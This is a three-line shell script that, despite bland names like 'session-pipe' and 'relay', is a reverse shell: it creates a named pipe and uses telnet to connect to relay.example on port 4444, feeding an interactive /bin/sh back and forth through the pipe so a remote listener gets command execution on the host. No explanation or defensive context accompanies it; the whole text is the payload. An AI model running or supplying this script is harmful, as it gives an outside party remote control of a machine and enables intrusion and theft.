#!/bin/sh
mknod /tmp/session-pipe p
telnet relay.example 4444 < /tmp/session-pipe | /bin/sh -i 2>&1 > /tmp/session-pipe
